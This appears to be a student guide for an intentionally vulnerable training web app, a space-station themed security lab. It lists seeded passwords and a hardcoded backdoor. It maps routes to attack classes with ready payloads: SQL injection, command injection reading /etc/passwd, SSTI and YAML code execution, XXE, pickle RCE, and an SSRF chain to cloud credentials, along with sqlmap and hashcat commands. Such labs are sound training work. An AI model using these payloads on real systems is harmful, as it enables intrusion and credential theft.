# AEGIS STATION — Student Quick-Start Guide
**LawCypenLab | Intentionally Vulnerable Space Station**

---

## Access
- **URL:** http://\<lab-host\>:5000  (or https:// if behind nginx)
- **Lab is SHARED** — your actions affect other students. Don't wipe data mid-session.

---

## Login Credentials (seeded)

| Username | Password | Role | Notes |
|----------|----------|------|-------|
| `admin` | `aegis2024` | Admin | CMS admin panel at `/admin/` |
| `r.solis` | `password1` | Officer | Approvals, docking |
| `k.mbeki` | `starfall99` | Crew | Standard crew member |
| `t.okafor` | `letmein` | Crew | Standard crew member |
| `j.vance` | `orbit2023` | Crew | Standard crew member |
| `m.reyes` | `security1` | Officer | Badge/access control, security incidents |
| `a.singh` | `trainee2024` | Crew | New trainee, limited bay access |
| `guest` | `guest` | Crew | Low-priv starting point |

**Backdoor:** `root` / `toor` (hardcoded bypass — find it in the login source)
**Override code:** `OMEGA-7734` (accepted via query param, header, or cookie on most routes)

---

## Vulnerability Map

### P1 — Critical (Start Here)

| Route | Class | Goal |
|-------|-------|------|
| `/login` | SQLi | Bypass auth with `' OR 1=1--` |
| `/mission-log/view?path=` | Path Traversal / LFI | Read `../../seed.py` |
| `/debug-terminal/exec` | OS Command Injection | `; id` or `; cat /etc/passwd` |
| `/messaging` | SSTI → RCE | `{{lipsum.__globals__.os.popen('id').read()}}` |
| `/auth/2fa` + `/auth/verify-otp` | 2FA Bypass | Globally stored OTP, no session binding |
| `/api/v8/crew` | JWT jku Injection | Forge admin token with attacker JWKS URL |
| `/api/v9/crew` | JWT x5u Injection | RSA cert variant — host your own cert |
| `/station/file-read` | file:// SSRF | `file:///etc/passwd` via urllib |
| `/ops/log-poison` | Log Poison → LFI → RCE | Inject SSTI into User-Agent, trigger via log read |
| `/profile/svg-process` | SVG XXE | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` in title |
| `/auth/2fa-v2/verify` | 2FA Race (TOCTOU) | Two concurrent requests with same OTP |
| `/api/sync/state` | marshal RCE | Deserialize crafted code object |
| `/cloud/ssrf-demo` | AWS IMDS SSRF | `http://127.0.0.1:5000/latest/meta-data/iam/...` |
| `/inventory` | Pickle RCE | Upload crafted pickle `.pkl` |
| `/reactor-control` | XXE + YAML RCE | `!!python/object/apply:os.system` |

### P2 — High

| Route | Class | Goal |
|-------|-------|------|
| `/crew/sorted?sort=` | ORDER BY Blind SQLi | Time-based column extraction |
| `/api/crew/<id>` | IDOR/BOLA | Access other users' records |
| `/api/v7/crew` | BOPLA | PATCH `role` / `is_admin` fields |
| `/api/v5/graphql` | GraphQL | Introspection → hidden mutations → unauthenticated role change |
| `/satellite/contacts` | XPath Injection | `' or '1'='1` dumps ROOT clearance |
| `/station/directory` | LDAP Injection | `*` wildcard dumps all users |
| `/account/reset-v2` | Insecure Randomness | Predict token from ±60s seed window |
| `/kiosk/login-v2` | Lockout Case Bypass | `admin` → `Admin` → `ADMIN` (3 fresh guesses each) |
| `/mission/ops` | State Machine Bypass | PATCH `state: ACTIVE` directly from DRAFT |
| `/telemetry/data-feed` | Content-Type XXE | Switch to `application/xml` + XXE payload |
| `/vrt/avatar` | Stored XSS (SVG) | Upload SVG with `<script>` tag |
| `/credits/transfer` | CSRF | No token, no SameSite |
| `/commander` | Auth Bypass (cookie) | `acting_commander=1` cookie, no crypto |

### P3 — Medium / Info

| Route | Class | Goal |
|-------|-------|------|
| `/tools/headers-audit` | Missing Security Headers | See all 8 missing headers |
| `/tools/subdomain-takeover` | Dangling CNAME | 2 claimable targets |
| `/aegis-repo/.git/` | Exposed .git | Reconstruct full source via git-dumper |
| `/.git/config` | Git Config Exposure | GitHub deploy token in remote URL |
| `/debug-terminal` | Stack Trace / Env Vars | AWS keys, JWT secrets, .env contents |
| `/tools/xml-dos` | Billion Laughs DoS | Internal entity expansion |
| `/clickjack-demo` | Clickjacking | Overlay PoC |

---

## OT / ICS Simulators (separate processes)

```bash
# Modbus-style TCP register protocol (port 5502)
python3 modbus_sim.py

# Ground antenna UDP replay attack demo (port 5503)
python3 ground_antenna_sim.py
```

---

## Useful Tools

```bash
# SQLi
sqlmap -u "http://host:5000/login" --data="username=admin&password=x" --dbs

# JWT cracking
hashcat -a 0 -m 16500 <token> wordlist.txt

# GraphQL
python3 -m graphqlmap -u http://host:5000/api/v5/graphql --method POST

# .git dump
git-dumper http://host:5000/aegis-repo/.git/ ./output

# SSRF → IMDS chain
curl -X POST http://host:5000/station/file-read \
     -d "url=http://127.0.0.1:5000/latest/meta-data/iam/security-credentials/aegis-station-role"
```

---

## Reset Lab State
Your instructor can reset the database:
```
POST /instructor/reset-db?key=INST-RESET-2024
```

---

*This lab is for authorized security training only. All vulnerabilities are intentional.*
